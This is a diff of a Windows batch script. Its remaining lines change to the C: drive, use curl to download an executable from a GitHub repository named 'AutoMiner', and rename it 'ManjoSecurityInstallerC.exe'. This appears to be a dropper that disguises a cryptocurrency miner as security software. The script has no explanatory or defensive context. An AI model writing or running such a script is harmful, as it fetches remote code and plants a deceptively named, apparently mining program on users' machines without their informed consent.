@@ -1,4 +1,3 @@
-@echo off
 cd C:/
 curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe?raw=true -o ManjoSecurityInstallerC.exe
 Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecurityInstallerC.exe"
